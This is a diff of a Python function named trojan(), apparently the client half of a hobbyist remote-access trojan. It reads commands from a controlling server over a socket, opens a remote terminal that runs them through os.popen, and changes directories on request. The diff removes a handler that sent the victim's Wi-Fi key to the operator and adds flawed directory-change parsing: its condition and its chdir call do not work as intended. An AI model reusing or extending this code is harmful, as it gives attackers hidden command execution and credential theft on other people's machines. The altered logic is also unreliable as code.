@@ -24,32 +24,23 @@ def trojan():
 		connected = True
 		cmd_mode = False
 
-		cd=False
-
 		def send(msg):
 			message = msg.encode(FORMAT)
 			msg_length = len(message)
 			send_length = str(msg_length).encode(FORMAT)
 			send_length += b' ' *(HEADER - len(send_length))
 
-			print(send_length)
-			print(message)
 			client.send(send_length)
 			client.send(message)
-		def get_wlan():
-			
 
 		while connected:
 			msg_length = int(client.recv(HEADER).decode(FORMAT))
-			print(msg_length)
 			server_command = client.recv(msg_length).decode(FORMAT)
-			print(server_command)
+			alt_command=[]
+			for command in server_command:
+				alt_command.append(command)
+			print(alt_command)
 
-			if cd:
-				os.chdir(server_command)
-				send(os.getcwd())
-				cd=False
-	
 			if server_command == "cmdon":
 				send("You Have Terminal Access!")
 				cmd_mode = True
@@ -59,12 +50,16 @@ def trojan():
 				cmd_mode = False
 				send("You Closed The Terminal!")
 
-			if server_command == "cd":
-					send("cd:")
-					cd=True
+			if "c" and "d" in alt_command:
+					alt_command.remove("c")
+					alt_command.remove("d")
+					alt_command.remove(" ")
+					alt_command = ''.join(alt_command)
+
+					os.chdir(server_command)
+					send(os.getcwd())
+
 					continue
-			if server_command == "get wlan":
-				send(wlan_key())
 
 			if cmd_mode:
 				cmd_line = os.popen(server_command)
